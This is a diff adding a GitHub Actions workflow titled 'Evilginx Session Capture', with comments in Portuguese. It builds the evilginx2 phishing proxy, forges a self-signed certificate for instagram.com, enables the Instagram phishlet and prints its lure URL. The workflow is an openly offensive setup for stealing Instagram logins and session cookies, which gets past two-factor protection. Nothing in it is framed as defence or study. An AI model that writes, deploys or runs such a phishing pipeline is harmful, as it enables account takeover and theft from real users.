@@ -1,0 +1,49 @@
+name: Evilginx Session Capture
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y git build-essential curl wget jq
+
+      - name: Clone Evilginx
+        run: |
+          git clone https://github.com/kgretzky/evilginx2.git
+          cd evilginx2
+          make
+          cp evilginx /usr/local/bin/
+
+      - name: Configure Evilginx
+        run: |
+          mkdir -p /etc/evilginx/certs
+          # Gera certificado auto-assinado para testes rápidos
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=instagram.com"
+          cp cert.pem /etc/evilginx/certs/fullchain.pem
+          cp key.pem /etc/evilginx/certs/privkey.pem
+
+      - name: Start Evilginx
+        run: |
+          cd evilginx2
+          ./evilginx -config /etc/evilginx/config.yml &
+          sleep 5
+          # Carrega o módulo do Instagram
+          echo "phishlets enable instagram" | ./evilginx
+          echo "phishlets get-url instagram" | ./evilginx
+          # Mantém o processo vivo
+          tail -f /dev/null
